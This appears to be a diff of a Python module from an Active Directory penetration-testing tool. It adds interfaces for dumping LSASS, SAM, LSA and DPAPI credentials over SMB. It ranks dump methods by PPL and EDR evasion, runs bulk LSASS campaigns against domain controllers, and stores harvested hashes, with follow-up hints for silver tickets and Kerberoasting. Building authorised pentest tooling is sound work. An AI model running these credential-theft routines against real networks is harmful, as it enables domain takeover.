@@ -22,10 +22,12 @@ is centralized in this module for consistency and maintainability.
 from __future__ import annotations
 
 from dataclasses import dataclass
-from typing import Any
+from contextlib import contextmanager
+from pathlib import Path
+from typing import Any, Callable
+import asyncio
 import os
 import re
-import shlex
 
 from rich.prompt import Confirm
 
@@ -35,6 +37,7 @@ from adscan_internal import (
     print_info,
     print_info_table,
     print_info_debug,
+    print_info_verbose,
     print_instruction,
     print_panel,
     print_success,
@@ -42,24 +45,8 @@ from adscan_internal import (
     print_operation_header,
     telemetry,
 )
-from adscan_internal.integrations.netexec.parsers import (
-    parse_netexec_delegated_auth_failure,
-)
-from adscan_internal.integrations.impacket.runner import (
-    RunCommandAdapter,
-    run_raw_impacket_command,
-)
 from adscan_internal.services.exploitation.lsass import (
-    DelegatedLsassDumpRequest,
-    LsaReaperCommandRequest,
-    LsassDumpOutcome,
-    LsassDumpService,
-    build_lsa_reaper_command,
     parse_pypykatz_credentials,
-    resolve_lsa_reaper_python,
-    resolve_lsa_reaper_script_path,
-    resolve_lsassy_executable,
-    resolve_wmiexec_script,
 )
 from adscan_internal.rich_output import (
     ScanProgressTracker,
@@ -72,6 +59,608 @@ from adscan_internal.workspaces.computers import (
     resolve_domain_service_target_file,
 )
 from adscan_internal.workspaces.subpaths import domain_relpath
+
+
+from adscan_internal.services.exploitation.native_dump_service import NativeDumpService
+from adscan_internal.services.exploitation.dpapi_native_dump import (
+    DpapiNativeDumpService,
+    DpapiDumpResult as DpapiFullDumpResult,
+)
+from adscan_internal.services.exploitation.dump_display import (
+    DumpDisplay,
+    CredentialType,
+)
+from adscan_internal.services.smb_transport import SMBConfig
+from adscan_internal.services.async_bridge import run_async_sync
+
+from rich.table import Table
+from rich.panel import Panel
+from rich import box as rbox
+from rich.console import Console as RichConsole
+from rich.progress import (
+    BarColumn,
+    MofNCompleteColumn,
+    Progress,
+    SpinnerColumn,
+    TextColumn,
+    TimeElapsedColumn,
+)
+from rich.text import Text as RichText
+
+from adscan_internal.services.exploitation.host_fingerprint_service import (
+    HostFingerprint,
+    HostFingerprintService,
+)
+from adscan_internal.services.host_reachability_filter import (
+    filter_reachable_hosts,
+    print_reachability_summary,
+    render_no_reachable_panel,
+)
+from adscan_internal.services.smb_privilege import (
+    SMBPrivilegeConfig,
+    SMBPrivilegeStatus,
+    check_smb_privilege_batch,
+)
+from adscan_internal.services.exploitation.lsass_orchestrator import (
+    LsassMethod,
+    LsassMethodSelector,
+    LsassDumpOrchestrator,
+    _ALL_METHODS,
+)
+from adscan_internal.workspaces.edr_intelligence import EdrIntelligence
+from adscan_core.rich_output_collection import (
+    SessionHeader,
+    SessionLootCard,
+    print_session_header,
+    print_session_loot_card,
+)
+from adscan_core.theme import (
+    COLOR_AMBER,
+    COLOR_CRIMSON,
+    COLOR_MUTED,
+    COLOR_SAGE,
+    COLOR_STEEL,
+)
+
+# ---------------------------------------------------------------------------
+# Operator Dark palette  -  mapped onto adscan_core.theme semantic slots so
+# the dump UX participates in the global ADscan palette and a single theme
+# refresh propagates everywhere. Local aliases stay short for the
+# high-frequency call sites below.
+#
+# Slot mapping (semantic -> file alias):
+#   COLOR_SAGE    -> _ACID    : success, recovered credentials, yes
+#   COLOR_STEEL   -> _ICE     : structural info, host names, section accents
+#   COLOR_AMBER   -> _AMBER   : caution, OPSEC warnings, uploads
+#   COLOR_CRIMSON -> _LAVA    : failure, EDR catch, high-severity actions
+#   COLOR_MUTED   -> _MUTED   : secondary labels, pending, metadata
+# ---------------------------------------------------------------------------
+_ACID = COLOR_SAGE
+_ICE = COLOR_STEEL
+_AMBER = COLOR_AMBER
+_LAVA = COLOR_CRIMSON
+_MUTED = COLOR_MUTED
+
+_CONSOLE = RichConsole()
+
+
+def _render_fingerprint_panel(fp: HostFingerprint, ranked: list[LsassMethod]) -> None:
+    """Print host security posture panel + ranked method table."""
+    if fp.ppl_level == 0:
+        ppl_label = f"[{_ACID}]off[/{_ACID}]"
+    elif fp.ppl_level == 1:
+        ppl_label = f"[{_LAVA}]RunAsPPL=1  (PPL enabled)[/{_LAVA}]"
+    else:
+        ppl_label = f"[{_LAVA}]RunAsPPL={fp.ppl_level}  (PPLLsa)[/{_LAVA}]"
+
+    lines: list[str] = [
+        f"[{_MUTED}]  Host    [/{_MUTED}] [{_ICE}]{fp.target_ip}[/{_ICE}]",
+        f"[{_MUTED}]  PPL     [/{_MUTED}] {ppl_label}",
+    ]
+
+    if fp.detected_products:
+        for p in fp.detected_products:
+            cat_color = _LAVA if p.category == "edr" else _AMBER
+            cat_badge = f"[bold {cat_color}]{'EDR' if p.category == 'edr' else ' AV '}[/bold {cat_color}]"
+            if p.active:
+                state = f"[{_LAVA}]● ACTIVE[/{_LAVA}]"
+            elif p.running and not p.realtime_protection:
+                state = f"[{_AMBER}]○ running  RTP off[/{_AMBER}]"
+            else:
+                state = f"[{_MUTED}]○ installed  inactive[/{_MUTED}]"
+            lines.append(f"  {cat_badge}  [bold]{p.name}[/bold]  {state}")
+    else:
+        lines.append(
+            f"[{_MUTED}]  AV/EDR  [/{_MUTED}] [{_ACID}]none detected[/{_ACID}]"
+        )
+
+    # Selected method rationale line
+    if ranked:
+        best = ranked[0]
+        reasons: list[str] = []
+        if fp.ppl_enabled and best.ppl_safe:
+            reasons.append("PPL-safe")
+        if not best.needs_upload:
+            reasons.append("no upload")
+        if not fp.has_edr and not fp.ppl_enabled:
+            reasons.append("clean host → LOTL preferred")
+        rationale = "  ·  ".join(reasons) if reasons else best.description[:60]
+        lines.append("")
+        lines.append(
+            f"[{_MUTED}]  Selected[/{_MUTED}] [{_ACID}]{best.display}[/{_ACID}]"
+            f"  [{_MUTED}]({rationale})[/{_MUTED}]"
+        )
+
+    _CONSOLE.print(
+        Panel(
+            "\n".join(lines),
+            title=f"[bold {_ICE}]◉  Host Intel[/bold {_ICE}]",
+            subtitle=f"[{_MUTED}]{fp.elapsed_s:.1f}s[/{_MUTED}]",
+            border_style=_ICE,
+            padding=(0, 1),
+        )
+    )
+
+    # Ranked methods table (compact: show top 5 only)
+    table = Table(
+        box=rbox.SIMPLE,
+        show_header=True,
+        header_style=f"bold {_ICE}",
+        pad_edge=False,
+        show_edge=False,
+    )
+    table.add_column("#", style=_MUTED, width=3)
+    table.add_column("Method", style="bold white", min_width=30)
+    table.add_column("PPL", width=5, justify="center")
+    table.add_column("Upload", width=7, justify="center")
+    table.add_column("OPSEC", width=7)
+
+    for i, m in enumerate(ranked[:5], 1):
+        ppl_cell = f"[{_ACID}]✓[/{_ACID}]" if m.ppl_safe else f"[{_LAVA}]✗[/{_LAVA}]"
+        upload_cell = (
+            f"[{_AMBER}]yes[/{_AMBER}]" if m.needs_upload else f"[{_ACID}]no[/{_ACID}]"
+        )
+        opsec_color = (
+            _ACID if m.opsec_score >= 4 else (_AMBER if m.opsec_score >= 3 else _LAVA)
+        )
+        opsec_bar = f"[{opsec_color}]{'█' * m.opsec_score}[/{opsec_color}][{_MUTED}]{'░' * (5 - m.opsec_score)}[/{_MUTED}]"
+        if i == 1:
+            num = f"[bold {_ACID}]→[/bold {_ACID}]"
+            name_cell = f"[bold {_ACID}]{m.display}[/bold {_ACID}]"
+        else:
+            num = f"[{_MUTED}]{i}[/{_MUTED}]"
+            name_cell = f"[{_MUTED}]{m.display}[/{_MUTED}]"
+        table.add_row(num, name_cell, ppl_cell, upload_cell, opsec_bar)
+
+    _CONSOLE.print(table)
+
+
+def _prompt_method_confirm(ranked: list[LsassMethod]) -> LsassMethod | None:
+    """Ask operator to confirm or override the selected method.
+
+    Returns the method to use, or None if the operator chose to abort.
+    Accepts: Enter (confirm), 1-N (pick method by rank), q (quit).
+    """
+    from rich.prompt import Prompt as _RPrompt
+
+    best = ranked[0]
+    upload_tag = f"  [{_AMBER}]↑ uploads binary[/{_AMBER}]" if best.needs_upload else ""
+    _CONSOLE.print(
+        f"\n  [{_MUTED}]Selected[/{_MUTED}]  [{_ACID}]{best.display}[/{_ACID}]{upload_tag}"
+    )
+    n = min(len(ranked), 7)
+    _CONSOLE.print(
+        f"  [{_MUTED}]Enter[/{_MUTED}] to confirm"
+        f"  [{_MUTED}]·[/{_MUTED}]  [{_MUTED}]1-{n}[/{_MUTED}] to pick"
+        f"  [{_MUTED}]·[/{_MUTED}]  [{_MUTED}]q[/{_MUTED}] to quit\n"
+    )
+    answer = _RPrompt.ask("  ?", default="y", console=_CONSOLE).strip().lower()
+    if answer in ("q", "quit", "n", "no", "0"):
+        return None
+    if answer.isdigit():
+        idx = int(answer) - 1
+        if 0 <= idx < len(ranked):
+            return ranked[idx]
+    return best
+
+
+def _make_method_failed_gate(
+    ranked: list[LsassMethod],
+) -> Callable[[LsassMethod, "LsassMethod | None"], bool]:
+    """Return a mid-cascade gate callback for interactive single-host dumps.
+
+    After each failed attempt, asks the operator whether to try the next method.
+    Skips the prompt when no further methods remain (let the orchestrator handle
+    the exhausted-methods result).
+    """
+    from rich.prompt import Confirm as _RConfirm
+
+    def _gate(failed: LsassMethod, next_method: LsassMethod | None) -> bool:
+        if next_method is None:
+            return True  # nothing left to ask; let orchestrator produce the failure result
+        upload_tag = (
+            f"  [{_AMBER}](uploads binary)[/{_AMBER}]"
+            if next_method.needs_upload
+            else ""
+        )
+        _CONSOLE.print(
+            f"\n  [{_AMBER}]↻[/{_AMBER}]  Next: [{_ACID}]{next_method.display}[/{_ACID}]{upload_tag}"
+        )
+        return _RConfirm.ask(
+            f"  [{_ICE}]Try it?[/{_ICE}]", default=True, console=_CONSOLE
+        )
+
+    return _gate
+
+
+def _render_catch_alert(method_name: str, product: str) -> None:
+    _CONSOLE.print(
+        Panel(
+            f"[{_LAVA}]Method [bold]{method_name}[/bold] was caught by [bold]{product}[/bold].[/{_LAVA}]\n"
+            f"[{_MUTED}]Catch recorded. Future attempts against hosts with {product} will be warned.[/{_MUTED}]",
+            title=f"[bold {_LAVA}]⚠ AV/EDR CATCH DETECTED[/bold {_LAVA}]",
+            border_style=_LAVA,
+        )
+    )
+
+
+def _render_global_edr_warnings(warnings: list[str]) -> None:
+    if not warnings:
+        return
+    body = "\n".join(f"[{_AMBER}]• {w}[/{_AMBER}]" for w in warnings)
+    _CONSOLE.print(
+        Panel(
+            body,
+            title=f"[bold {_AMBER}]◈ Global EDR Intelligence[/bold {_AMBER}]",
+            border_style=_AMBER,
+        )
+    )
+
+
+# ---------------------------------------------------------------------------
+# OPSEC disclosure gates  -  every dump path discloses Windows event telemetry
+# before any confirmation prompt. Severity-matched per tui-design Dialogs:
+# reversible / moderate / severe.
+# ---------------------------------------------------------------------------
+_OPSEC_PROFILES: dict[str, dict[str, Any]] = {
+    "lsass": {
+        "severity": "severe",
+        "icon": "▲",
+        "border": _LAVA,
+        "summary": "Highly logged. Triggers Microsoft Defender / MDE / MDI alerts.",
+        "events": [
+            "4688  -  process creation (comsvcs.dll / rundll32 / handle pivot)",
+            "4663  -  object access on lsass.exe",
+            "Sysmon 10  -  process access of lsass.exe (most SOCs alert on this)",
+            "MDI / MDE  -  \"Suspicious LSASS access\" telemetry",
+        ],
+        "blast": "Single host. Drops a temporary file on ADMIN$ before retrieval.",
+    },
+    "sam": {
+        "severity": "moderate",
+        "icon": "●",
+        "border": _AMBER,
+        "summary": "Backup Operators path. Visible via remote registry telemetry.",
+        "events": [
+            "4624 / 4672  -  logon + special-privileges assigned (SeBackup)",
+            "4656 / 4663  -  registry hive open with REG_OPTION_BACKUP_RESTORE",
+            "Sysmon 12 / 13  -  registry create / value-set on SAM key",
+        ],
+        "blast": "Reads SAM + SYSTEM hives via RRP. No binary upload.",
+    },
+    "lsa": {
+        "severity": "moderate",
+        "icon": "●",
+        "border": _AMBER,
+        "summary": "SECURITY hive read via remote registry; cached secrets exposed.",
+        "events": [
+            "4624 / 4672  -  logon + special-privileges assigned",
+            "4656 / 4663  -  registry hive open against SECURITY",
+            "Sysmon 12 / 13  -  registry telemetry on SECURITY key",
+        ],
+        "blast": "Reads SECURITY + SYSTEM hives via RRP. No binary upload.",
+    },
+    "dpapi": {
+        "severity": "low",
+        "icon": "○",
+        "border": _ICE,
+        "summary": "Reads DPAPI material; quiet on EDR unless DA backup-key route fails over.",
+        "events": [
+            "4624  -  logon to the DC (DA route) or target host (non-DA route)",
+            "5145  -  SMB share access on ADMIN$ for masterkey retrieval",
+        ],
+        "blast": "DA route: reads backup-key PVK from DC. Non-DA route: per-user masterkeys only.",
+    },
+    "registry": {
+        "severity": "moderate",
+        "icon": "●",
+        "border": _AMBER,
+        "summary": "Same surface as SAM + LSA combined against the PDC.",
+        "events": [
+            "4624 / 4672  -  logon + special-privileges assigned (SeBackup)",
+            "4656 / 4663  -  registry hive open against SAM, SECURITY, SYSTEM",
+        ],
+        "blast": "Reads three hives from the PDC via RRP. No binary upload.",
+    },
+}
+
+
+def _render_opsec_panel(dump_kind: str, *, target_label: str) -> None:
+    """Print an OPSEC disclosure panel before any dump-action confirmation.
+
+    Discloses the Windows event IDs the operation will plausibly trigger,
+    the blast radius, and a one-line severity summary. Color + leading
+    glyph pairing keeps the panel readable under NO_COLOR.
+    """
+    profile = _OPSEC_PROFILES.get(dump_kind.lower())
+    if not profile:
+        return
+
+    severity = profile["severity"]
+    icon = profile["icon"]
+    border = profile["border"]
+    sev_label = {
+        "severe": f"[bold {_LAVA}]SEVERE[/bold {_LAVA}]",
+        "moderate": f"[bold {_AMBER}]MODERATE[/bold {_AMBER}]",
+        "low": f"[bold {_ICE}]LOW[/bold {_ICE}]",
+    }[severity]
+
+    lines: list[str] = [
+        f"[{_MUTED}]  Target    [/{_MUTED}] {target_label}",
+        f"[{_MUTED}]  Severity  [/{_MUTED}] {sev_label}  [{_MUTED}]{profile['summary']}[/{_MUTED}]",
+        f"[{_MUTED}]  Blast     [/{_MUTED}] [{_MUTED}]{profile['blast']}[/{_MUTED}]",
+        "",
+        f"[bold {border}]  Telemetry this will plausibly trigger[/bold {border}]",
+    ]
+    for ev in profile["events"]:
+        lines.append(f"[{_MUTED}]    {icon}  {ev}[/{_MUTED}]")
+
+    _CONSOLE.print(
+        Panel(
+            "\n".join(lines),
+            title=f"[bold {border}]{icon}  {dump_kind.upper()} Dump  ·  OPSEC[/bold {border}]",
+            border_style=border,
+            padding=(0, 1),
+        )
+    )
+
+
+def _confirm_severe_lsass(target_label: str, host: str) -> bool:
+    """Severity-matched LSASS gate. Operator must explicitly type the host
+    short name (or `y` as a soft confirm) to proceed.
+
+    Per tui-design Dialogs table: severe / irreversible actions require an
+    explicit resource-name input, not a default-yes. LSASS is the loudest
+    Windows telemetry surface in the dump catalog; the gate exists to keep
+    accidental keystrokes from generating SOC tickets.
+    """
+    from rich.prompt import Prompt as _RPrompt
+
+    short = (host.split(".")[0] if host else "").strip()
+    if not short or short.lower() in {"all", "all hosts"}:
+        # Bulk path has its own confirmation panel; fall through to a simple yes.
+        return Confirm.ask(
+            f"  [{_LAVA}]Proceed with LSASS dump?[/{_LAVA}]",
+            default=False,
+            console=_CONSOLE,
+        )
+
+    _CONSOLE.print(
+        f"\n  [{_MUTED}]Type [/{_MUTED}][bold {_LAVA}]{short}[/bold {_LAVA}]"
+        f"  [{_MUTED}]to confirm, or [/{_MUTED}][bold {_LAVA}]y[/bold {_LAVA}]"
+        f"  [{_MUTED}]to override the gate, or Enter to abort.[/{_MUTED}]"
+    )
+    answer = _RPrompt.ask("  ?", default="", console=_CONSOLE).strip()
+    if not answer:
+        return False
+    return answer == short or answer.lower() in {"y", "yes"}
+
+
+def _render_bulk_next_hint(
+    dump_kind: str,
+    *,
+    finding_count: int,
+    succeeded: int,
+    extra: str | None = None,
+) -> None:
+    """Action-oriented `Next:` hint shown after a bulk summary.
+
+    Verdict-first language: leads with what was recovered (`{finding_count}
+    credentials`) and points the operator at the most useful next step
+    instead of leaving them at an empty prompt.
+    """
+    kind = dump_kind.upper()
+    if finding_count == 0 and succeeded == 0:
+        hint = (
+            "Verify reachability and credentials; check the OPSEC panel for "
+            "which event IDs would have fired if auth had landed."
+        )
+    elif finding_count == 0:
+        hint = (
+            f"Auth landed on {succeeded} host(s) but no credentials were "
+            "recovered. Try a different dump kind or rotate identities."
+        )
+    elif kind == "SAM":
+        hint = (
+            "Use the reuse matrix above to spot multi-host admins, then run "
+            "`attack_paths owned` to materialize the new edges."
+        )
+    elif kind == "LSA":
+        hint = (
+            "Machine-account hashes can be used for silver tickets or RBCD; "
+            "try `kerberoast` or `hassession` from any DC$."
+        )
+    elif kind == "DPAPI":
+        hint = (
+            "Backup-key GUIDs above unlock per-user masterkeys; pair with a "
+            "DPAPI credential dump from the same host."
+        )
+    elif kind == "LSASS":
+        hint = (
+            "Recovered identities are now in the credential store; run "
+            "`attack_paths owned` and check if any cred is DA-eligible."
+        )
+    else:
+        hint = "Continue with the next attack-path action."
+
+    if extra:
+        hint = f"{hint}  {extra}"
+
+    _CONSOLE.print(
+        f"  [{_MUTED}][bold]Next:[/bold]  {hint}[/{_MUTED}]\n"
+    )
+
+
+
+def _build_smb_config_from_shell(shell: Any, host: str, domain: str) -> SMBConfig:
+    """Build an SMBConfig from the shell's current credential context.
+
+    Used by the native dump path to build an aiosmb connection without any
+    subprocess-based credential dumping dependency.
+    """
+    creds = getattr(shell, "current_creds", None) or {}
+    dc_ip = creds.get("dc_ip") or getattr(shell, "current_dc_ip", None) or host
+    return SMBConfig(
+        target_ip=host,
+        target_hostname=host,
+        domain=domain,
+        auth_domain=creds.get("auth_domain") or domain,
+        username=creds.get("username"),
+        password=creds.get("password"),
+        nt_hash=creds.get("nt_hash"),
+        aes_key=creds.get("aes_key"),
+        ccache_path=creds.get("ccache_path"),
+        use_kerberos=bool(creds.get("ccache_path") or creds.get("aes_key")),
+        kdc_ip=dc_ip,
+    )
+
+
+def _run_native_async(coro: Any) -> Any:
+    """Run an async coroutine from sync code, with event-loop fallback."""
+    return run_async_sync(coro)
+
+
+def _native_dump_supported(shell: Any, host: str) -> bool:
+    """Return True when the native fast-path can run for this target."""
+    if _is_bulk_dump_target(host):
+        return False
+    if not host or str(host).strip().lower() == "all":
+        return False
+    creds = getattr(shell, "current_creds", None) or {}
+    # Need at least one usable secret.
+    if not (
+        creds.get("password")
+        or creds.get("nt_hash")
+        or creds.get("aes_key")
+        or creds.get("ccache_path")
+    ):
+        return False
+    if not creds.get("username"):
+        return False
+    return True
+
+
+def _explicit_native_dump_supported(*, host: str, username: str, secret: str) -> bool:
+    """Return True when explicit CLI dump credentials can use native SMB."""
+    if _is_bulk_dump_target(host):
+        return False
+    if not host or str(host).strip().lower() in {"all", "all hosts"}:
+        return False
+    if not str(username or "").strip():
+        return False
+    return bool(str(secret or "").strip())
+
+
+def _credential_secret_fields(secret: str) -> dict[str, str | None]:
+    """Map one CLI credential value to password/hash/ccache fields."""
+    secret_clean = str(secret or "").strip()
+    if secret_clean.lower().endswith(".ccache"):
+        return {
+            "password": None,
+            "nt_hash": None,
+            "aes_key": None,
+            "ccache_path": secret_clean,
+        }
+    if len(secret_clean) == 32 and all(
+        char in "0123456789abcdefABCDEF" for char in secret_clean
+    ):
+        return {
+            "password": None,
+            "nt_hash": secret_clean,
+            "aes_key": None,
+            "ccache_path": None,
+        }
+    if len(secret_clean) in {32, 64} and all(
+        char in "0123456789abcdefABCDEF" for char in secret_clean
+    ):
+        return {
+            "password": None,
+            "nt_hash": None,
+            "aes_key": secret_clean,
+            "ccache_path": None,
+        }
+    return {
+        "password": secret_clean,
+        "nt_hash": None,
+        "aes_key": None,
+        "ccache_path": None,
+    }
+
+
+@contextmanager
+def _temporary_dump_creds(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    secret: str,
+    islocal: str | None,
+) -> Any:
+    """Temporarily expose explicit dump credentials to native dump helpers."""
+    previous = getattr(shell, "current_creds", None)
+    secret_fields = _credential_secret_fields(secret)
+    current = dict(previous or {})
+    current.update(
+        {
+            "username": username,
+            "auth_domain": "" if str(islocal).lower() == "true" else domain,
+            **secret_fields,
+        }
+    )
+    # For machine accounts (username ending with "$"), enrich current_creds
+    # with the AES-256 key derived from the raw Kerberos password (stored in
+    # credentials_meta during persist_machine_account_credential).  Without
+    # this, AES-only DCs reject the SMB auth because current_creds["aes_key"]
+    # is None even though the derived key was already persisted.
+    if (
+        username.endswith("$")
+        and not current.get("aes_key")
+        and not current.get("ccache_path")
+    ):
+        try:
+            from adscan_internal.services.credentials.privilege_role import get_credential_meta
+            meta = get_credential_meta(shell, domain=domain, username=username)
+            if isinstance(meta, dict):
+                aes256_stored = meta.get("aes256_key") or meta.get("aes256")
+                if aes256_stored:
+                    current["aes_key"] = str(aes256_stored)
+                    # Keep nt_hash intact so the auth planner can fall back to
+                    # RC4 when the DC supports it; AES is preferred when the
+                    # posture shows KERBEROS_AES_ONLY=ENABLED.
+        except Exception:  # noqa: BLE001
+            pass
+    try:
+        setattr(shell, "current_creds", current)
+        yield
+    finally:
+        if previous is None:
+            try:
+                delattr(shell, "current_creds")
+            except AttributeError:
+                pass
+        else:
+            setattr(shell, "current_creds", previous)
+
 
 _NXC_SMB_LINE_RE = re.compile(r"^\s*SMB\s+\S+\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+")
 _NXC_REMOTE_LINE_RE = re.compile(
@@ -143,9 +732,198 @@ def _resolve_bulk_hosts_target(
     return hosts_file
 
 
+def _native_dump_concurrency(dump_kind: str) -> int:
+    """Per-type bounded concurrency.
+
+    LSASS creates a minidump on disk and triggers AV/Sysmon; keep it low.
+    SAM/LSA are registry-only and tolerate higher parallelism safely.
+    """
+    if dump_kind == "lsass":
+        raw = os.environ.get("ADSCAN_LSASS_DUMP_CONCURRENCY", "5")
+        default = 5
+    elif dump_kind in ("sam", "lsa"):
+        raw = os.environ.get("ADSCAN_NATIVE_DUMP_CONCURRENCY", "20")
+        default = 20
+    else:
+        raw = os.environ.get("ADSCAN_NATIVE_DUMP_CONCURRENCY", "15")
+        default = 15
+    try:
+        return max(1, min(64, int(str(raw).strip())))
+    except ValueError:
+        return default
+
+
+# Keep legacy alias so any external caller still compiles.
+def _native_bulk_concurrency() -> int:
+    return _native_dump_concurrency("sam")
+
+
+# ---------------------------------------------------------------------------
+# LSASS campaign helpers
+# ---------------------------------------------------------------------------
+
+_LSASS_DA_KEYWORDS: frozenset[str] = frozenset(
+    {"administrator", "admin", "da", "domainadmin", "krbtgt", "svc_"}
+)
+
+
+def _lsass_is_da_hint(username: str) -> bool:
+    u = username.lower()
+    return any(kw in u for kw in _LSASS_DA_KEYWORDS)
+
+
+def _lsass_smart_targets(shell: Any, domain: str) -> tuple[list[str], str]:
+    """Return (dc_hosts, tier_label) for smart LSASS targeting.
+
+    Priority: dcs.txt → pdc from domain_data → empty.
+    Callers fall back to the full host list when this returns empty.
+    """
+    domains_dir: str = getattr(shell, "domains_dir", "") or ""
+    dcs_path = domain_relpath(domains_dir, domain, "dcs.txt")
+    if os.path.isfile(dcs_path):
+        hosts = _load_native_bulk_hosts(dcs_path)
+        if hosts:
+            return hosts, "DCs"
+    pdc = str(shell.domains_data.get(domain, {}).get("pdc") or "").strip()
+    if pdc:
+        return [pdc], "PDC only"
+    return [], ""
+
+
+@dataclass
+class _LsassCampaignResult:
+    host: str
+    success: bool
+    cred_count: int
+    has_da_hint: bool
+    method_used: str
+    error: str | None
+
+
+def _lsass_campaign_confirmation(
+    dc_hosts: list[str],
+    tier_label: str,
+    all_hosts: list[str],
+    method: "LsassMethod",
+) -> tuple[bool, list[str]]:
+    """Show pre-campaign confirmation panel. Returns (proceed, selected_hosts)."""
+    from rich.prompt import Confirm as _RConfirm
+
+    concurrency = _native_dump_concurrency("lsass")
+    n = len(dc_hosts)
+    est_s = max(n // concurrency, 1) * 25
+    est_label = f"~{est_s // 60}m {est_s % 60}s" if est_s >= 60 else f"~{est_s}s"
+
+    lines = [
+        f"[{_MUTED}]  Targeting  [/{_MUTED}] [{_ICE}]{tier_label}[/{_ICE}]"
+        f"  [{_MUTED}]({n} hosts)[/{_MUTED}]",
+        f"[{_MUTED}]  Method     [/{_MUTED}] [{_ACID}]{method.display}[/{_ACID}]",
+        f"[{_MUTED}]  Concurrent [/{_MUTED}] [{_MUTED}]{concurrency} parallel[/{_MUTED}]",
+        f"[{_MUTED}]  Est. time  [/{_MUTED}] [{_MUTED}]{est_label}[/{_MUTED}]",
+        f"[{_MUTED}]  Noise      [/{_MUTED}] [{_AMBER}]Sysmon Event 10 × {n} hosts[/{_AMBER}]",
+    ]
+    _CONSOLE.print(
+        Panel(
+            "\n".join(lines),
+            title=f"[bold {_ICE}]◉  LSASS Campaign[/bold {_ICE}]",
+            border_style=_ICE,
+            padding=(0, 1),
+        )
+    )
+
+    selected = dc_hosts
+    if all_hosts and len(all_hosts) > len(dc_hosts):
+        if _RConfirm.ask(
+            f"  [{_AMBER}]Expand to all {len(all_hosts)} hosts?[/{_AMBER}]",
+            default=False,
+        ):
+            selected = all_hosts
+
+    return _RConfirm.ask(f"  [{_ICE}]Proceed?[/{_ICE}]", default=True), selected
+
+
+def _render_lsass_campaign_summary(
+    results: list[_LsassCampaignResult],
+) -> None:
+    total = len(results)
+    succeeded = sum(1 for r in results if r.success)
+    total_creds = sum(r.cred_count for r in results)
+    da_hosts = [r.host for r in results if r.has_da_hint]
+
+    lines = [
+        f"[{_MUTED}]  Hosts  [/{_MUTED}] [{_ICE}]{total}[/{_ICE}] targeted"
+        f"  [{_ACID}]{succeeded}[/{_ACID}] ok"
+        f"  [{_LAVA}]{total - succeeded}[/{_LAVA}] failed",
+        f"[{_MUTED}]  Creds  [/{_MUTED}] [{_ACID}]{total_creds}[/{_ACID}] accounts extracted",
+    ]
+    if da_hosts:
+        lines += ["", f"[{_AMBER}]  ⚡  HIGH VALUE[/{_AMBER}]"]
+        for h in da_hosts[:5]:
+            lines.append(f"[{_AMBER}]     {h}  ·  privileged session[/{_AMBER}]")
+        if len(da_hosts) > 5:
+            lines.append(f"[{_MUTED}]     … and {len(da_hosts) - 5} more[/{_MUTED}]")
+        lines.append(
+            f"\n[{_AMBER}]  → DA-level sessions found on {len(da_hosts)}"
+            f" host{'s' if len(da_hosts) != 1 else ''}[/{_AMBER}]"
+        )
+
+    border = _ACID if total_creds > 0 else _LAVA
+    title = (
+        f"[bold {_ACID}]✓  Campaign Complete[/bold {_ACID}]"
+        if total_creds > 0
+        else f"[bold {_LAVA}]✗  Campaign Failed[/bold {_LAVA}]"
+    )
+    _CONSOLE.print(
+        Panel("\n".join(lines), title=title, border_style=border, padding=(0, 1))
+    )
+
+
+def _load_native_bulk_hosts(path: str) -> list[str]:
+    """Load host targets from a plaintext target file."""
+    hosts: list[str] = []
+    seen: set[str] = set()
+    try:
+        with open(path, encoding="utf-8", errors="ignore") as handle:
+            for raw_line in handle:
+                line = raw_line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                host = line.split()[0].strip()
+                if not host:
+                    continue
+                key = host.lower()
+                if key in seen:
+                    continue
+                seen.add(key)
+                hosts.append(host)
+    except OSError as exc:
+        telemetry.capture_exception(exc)
+        print_error(
+            f"Could not read native dump target file: {mark_sensitive(path, 'path')}"
+        )
+    return hosts
+
+
+def _resolve_native_bulk_hosts(
+    shell: Any,
+    *,
+    domain: str,
+    requested_host: str,
+) -> list[str]:
+    """Resolve bulk dump hosts from `All` or an explicit target file."""
+    hosts_file = _resolve_bulk_hosts_target(
+        shell,
+        domain=domain,
+        requested_host=requested_host,
+    )
+    if not hosts_file:
+        return []
+    return _load_native_bulk_hosts(hosts_file)
+
+
 @dataclass(frozen=True)
 class ParsedDpapiCredential:
-    """Normalized DPAPI credential parsed from NetExec output."""
+    """Normalized DPAPI credential parsed from historical command output."""
 
     domain: str | None
     username: str
@@ -165,7 +943,7 @@ def _extract_dumped_credentials_with_hosts(
     *,
     excluded_substrings: set[str] | None = None,
 ) -> list[tuple[str, str | None]]:
-    """Extract dumped credential tokens and best-effort source host from NetExec output."""
+    """Extract dumped credential tokens and best-effort source host from command output."""
     if not output:
         return []
 
@@ -209,7 +987,7 @@ def _extract_dumped_credentials_with_hosts(
 
 
 def _parse_identity_domain_username(identity: str) -> tuple[str | None, str]:
-    """Split a NetExec identity into domain and username components."""
+    """Split a tool-style identity into domain and username components."""
     identity_clean = str(identity or "").strip()
     if "\\" in identity_clean:
         domain_name, username = identity_clean.split("\\", 1)
@@ -225,7 +1003,7 @@ def _parse_dpapi_credential_from_line(
     *,
     current_host: str | None,
 ) -> ParsedDpapiCredential | None:
-    """Parse a DPAPI credential from a single NetExec output line."""
+    """Parse a DPAPI credential from a single command-output line."""
     if "[CREDENTIAL]" in line:
         payload = line.split("[CREDENTIAL]", 1)[1].strip()
         for pattern in (
@@ -270,7 +1048,7 @@ def _parse_dpapi_credential_from_line(
 
 
 def _extract_dpapi_credentials_with_hosts(output: str) -> list[ParsedDpapiCredential]:
-    """Extract DPAPI credentials from SMB or WinRM NetExec output."""
+    """Extract DPAPI credentials from historical SMB or WinRM command output."""
     if not output:
         return []
 
@@ -471,7 +1249,7 @@ def _persist_bulk_credentials(
     dump_kind: str,
     auth_username: str | None,
     credentials: dict[tuple[str, str, bool], dict[str, Any]],
-    include_machine_accounts: bool = False,
+    include_machine_accounts: bool = True,
 ) -> None:
     """Persist aggregated bulk credentials using one add_credential call per credential."""
     for entry in credentials.values():
@@ -507,11 +1285,20 @@ def _persist_bulk_credentials(
                 credential_username=username,
                 secret=credential,
             )
+        _DUMP_KIND_ORIGINS: dict[str, str] = {
+            "DPAPI": "dpapi",
+            "LSA": "lsa_secrets",
+            "SAM": "sam_dump",
+            "LSASS": "lsass_dump",
+        }
         add_kwargs: dict[str, Any] = {
             "prompt_for_user_privs_after": False,
             "ui_silent": True,
             "ensure_fresh_kerberos_ticket": False,
         }
